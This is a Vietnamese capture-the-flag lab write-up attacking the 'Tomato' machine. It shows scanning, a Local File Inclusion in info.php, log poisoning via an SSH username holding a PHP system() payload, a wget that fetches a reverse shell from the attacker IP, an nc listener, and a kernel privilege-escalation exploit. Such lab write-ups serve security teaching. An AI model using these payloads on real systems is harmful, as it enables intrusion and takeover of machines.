# LAB 10
## Chuẩn bị
* Máy kali có ip `192.168.8.150` 
![image](https://user-images.githubusercontent.com/91528234/223001588-864ba829-debb-4e86-a0d2-c4fd373427b1.png)
* Máy nạn nhân chưa rõ ip
![image](https://user-images.githubusercontent.com/91528234/223019800-22d5362f-061c-4bd5-a2e2-ca3655ec3363.png)

## Quét mạng

* Mình dùng lệnh `netdiscorver` để quét ip máy nạn nhân
![image](https://user-images.githubusercontent.com/91528234/223019817-58eaa4a2-db8a-4c00-8984-e908d2d17171.png)

* Mình quét được thấy dải ip `192.168.8.153`
* Để tiếp tục quá trình này, chúng tôi sẽ khởi chạy Nmap.
```
nmap -sV -sS -p- 192.168.8.153
```
Trong đó:

-sS: scan bằng giao tức TCP SYN
-sV: scan tìm phiên bản của các dịch vụ chạy trên cổng
-p-: scan with full port (65535 port)
![image](https://user-images.githubusercontent.com/91528234/223020503-2f45abe4-0a8b-43e5-9ce4-0c474c59a114.png)
![image](https://user-images.githubusercontent.com/91528234/223043611-1a664829-a19a-4632-a364-a5ebcabb7a3f.png)
## Enumeration
* Bắt đầu với port 80 , sử dụng dirb để liệt kê thư mục
```
dirb http://192.168.1.3 -f
```
![image](https://user-images.githubusercontent.com/91528234/223043812-b8f2daf1-4620-4b5a-a8fa-8b411492176b.png)
* Truy cập theo đường dẫn dirb trả về:
![image](https://user-images.githubusercontent.com/91528234/223043987-e9c9f344-82e3-40fe-9728-0da461fe1040.png)
![image](https://user-images.githubusercontent.com/91528234/223044054-e65832f2-8ff3-474d-97f2-d54ac237f7d9.png)
* Tiến hành view-source ta nhận được nội dung:
![image](https://user-images.githubusercontent.com/91528234/223044212-5101891e-a7c9-4cfc-8131-55262fc54573.png)
* `</?php include $_GET['image']; ?> `gợi ý cho chúng ta về lỗ hổng Local File Inclusion (LFI)
## Khai thác Local File Inclusion (LFI)
* Với những gì tác giả đã để lại, chúng ta tiến hành kiểm thử với payload sau:
```
http://192.168.8.153/antibot_image/antibots/info.php?image=/etc/passwd
```
![image](https://user-images.githubusercontent.com/91528234/223044492-f8e942ed-9ee0-4dfe-87ad-68b16e4b318b.png)
## From LFI to RCE
* Với LFI trong tay, mình lần lượt tìm đọc nội dung các file quan trọng và phát hiện `auth.log` có thể đọc được thông qualỗ hổng này
```
http://192.168.8.153/antibot_image/antibots/info.php?image=/var/log/auth.log
```
![Screenshot from 2023-03-06 14-25-03](https://user-images.githubusercontent.com/91528234/223044860-469776be-2d28-418d-b59c-1199f3a6a067.png)
* "auth.log" là file lưu trữ nhật ký truy cập hệ thống. Khi chúng ta đăng nhập thông qua giao diện chính hay qua SSH thì các thông tin đều được lưu trữ tại đây kể cả thành công hay thất bại . Ví dụ như khi chúng ta đăng nhập vào Server thông qua SSH với nội dung ssh abcd@192.168.1.3 và nhập mật khẩu sai nhiều lần, thì nội dung auth.log sẽ ghi nhận :
![image](https://user-images.githubusercontent.com/91528234/223046346-60e360f3-635f-4f03-94a3-1d627b4d9154.png)
* chạy Payload sau:
```
ssh '<?php system($_GET["cmd"]);?>'@192.168.8.153 -p 2211
```
* cmd trên chạy trên máy chủ
```
http://192.168.8.153/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=id
```
* url trên chạy trên web
![image](https://user-images.githubusercontent.com/91528234/223047640-b4c2c6f6-7dba-4ea7-971e-d9214122194f.png)
* Tiến hành thực hiện revershell-shell theo cách sau :
* tải file github về máy chủ
```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```
* copy ra thư mục user
```
cp php-reverse-shell/php-reverse-shell.php php-reverse-shell.php
```
* xong sử dụng vim để sửa ip thành `192.168.8.150` và port `8081`
![image](https://user-images.githubusercontent.com/91528234/223049152-02b3fe1c-7cb4-45f2-ac31-a059f6a084e8.png)
* Sử dụng SimpleHTTPServer để build một web-server đơn giản trên máy attacker
```
python3 -m http.server 8081
```
![image](https://user-images.githubusercontent.com/91528234/223049582-2cdaed33-277d-4d06-b0f9-16d788eb3fa7.png)

* Download shell về Tomato
```
http://192.168.8.153/antibot_image/antibots/info.php?image=/var/log/auth.log&cmd=wget%20192.168.8.150:8081/php-reverse-shell.php%20-O%20/tmp/shell.php
```
![image](https://user-images.githubusercontent.com/91528234/223049775-039a82dc-1f87-4f9e-a424-5864f1db8b6c.png)
* Sử dụng net cat ở máy chủ lắng nghe cổng 8081
```
nc -nlvp 8081
```
* Thực thi shell
```
http://192.168.8.153/antibot_image/antibots/info.php?image=/tmp/shell.php
```
![image](https://user-images.githubusercontent.com/91528234/223050830-8bea8c48-9c64-49fe-bd3e-d0ca4eb465c1.png)
## Privilege Escalation
* Kiểm tra phiên bản Kernel bằng cách sử dụng lệnh:
```
uname -a 
```
![image](https://user-images.githubusercontent.com/91528234/223051239-372e1bea-3978-49ce-ba17-084ad1f59e20.png)
* Phiên bản Kernel tồn tại lỗ hổng cho phép leo thang đặc quyền .
* Thực hiện download mã khai thác và biên dịch với GCC trên máy Attacker
```
wget https://www.exploit-db.com/raw/45010 
mv 45010 /var/www/html/45010.c
gcc exploit.c -o exploit
chmod +x exploit
cp exploit /var/www/html
```
* Mở dịch vụ apache trên máy attacker
```
/etc/init.d/apache2 start
```
* Chuyển mã khai thác sang Tomato và thực thi
![image](https://user-images.githubusercontent.com/91528234/223295868-39533032-e26b-4cb0-a0a2-b8163c78177d.png)


